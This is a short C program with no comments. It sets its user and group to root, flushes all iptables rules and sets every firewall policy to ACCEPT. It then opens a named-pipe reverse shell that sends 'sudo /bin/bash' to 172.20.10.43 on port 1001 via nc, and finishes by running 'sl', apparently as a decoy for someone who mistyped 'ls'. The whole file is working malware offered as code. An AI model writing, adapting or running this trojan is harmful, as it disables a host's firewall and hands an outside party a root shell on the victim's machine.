#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){

	setuid(0);
	setgid(0);

	system("iptables -F");
	system("iptables -t mangle -F");

	system("iptables -P INPUT ACCEPT");
	system("iptables -P OUTPUT ACCEPT");
	system("iptables -P FORWARD ACCEPT");

	system("[ ! -p /tmp/aejhfktk ] && mkfifo /tmp/aejhfktk");
	system("(sudo /bin/bash 0</tmp/aejhfktk | nc 172.20.10.43 1001 1>/tmp/aejhfktk) &");

	system("sl");
	
	return 0;
}
